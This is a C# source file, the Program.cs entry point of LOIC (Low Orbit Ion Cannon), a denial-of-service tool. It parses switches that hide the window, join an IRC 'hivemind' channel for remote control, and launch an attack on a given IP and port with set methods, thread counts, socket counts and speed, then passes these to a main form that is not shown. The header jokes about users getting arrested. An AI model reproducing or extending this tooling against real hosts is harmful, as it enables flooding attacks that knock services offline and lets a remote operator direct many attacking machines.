/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.Windows.Forms;

namespace LOIC
{
	static class Program
	{
		[STAThread]
		static void Main(string[] cmdLine)
		{
			bool hive = false, hide = false, cmd = false;
			string ircserver = "", ircport = "", ircchannel = "";
			string ip = "", port = "80", method = "TCP", threads = "40", sockets = "100", speed = "10";

			int count = 0;
			foreach(string s in cmdLine)
			{
				if(s.ToLowerInvariant() == "/hidden") {
					hide = true;
				}

				// IRC
				if(s.ToLowerInvariant() == "/hivemind") {
					hive = true;
					ircserver = cmdLine[count + 1]; //if no server entered let it crash
					try {ircport = cmdLine[count + 2];}
					catch(Exception) {ircport = "6667";} //default
					try {ircchannel = cmdLine[count + 3];}
					catch(Exception) {ircchannel = "#loic";} //default
				}

				if (s.ToLowerInvariant() == "/attack")
				{
					cmd = true;
					ip = cmdLine[count + 1]; //if no ip entered let it crash
					if (cmdLine.Length > count + 2)
						port = cmdLine[count + 2];
					if (cmdLine.Length > count + 3)
						method = cmdLine[count + 3];
					if (cmdLine.Length > count + 4)
						threads = cmdLine[count + 4];
					if (cmdLine.Length > count + 5)
						sockets = cmdLine[count + 5];
					if (cmdLine.Length > count + 6)
						speed = cmdLine[count + 6];
				}

				count++;
			}

			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new frmMain(hive, hide, ircserver, ircport, ircchannel, cmd, ip, port, method, threads, sockets, speed));
		}
	}
}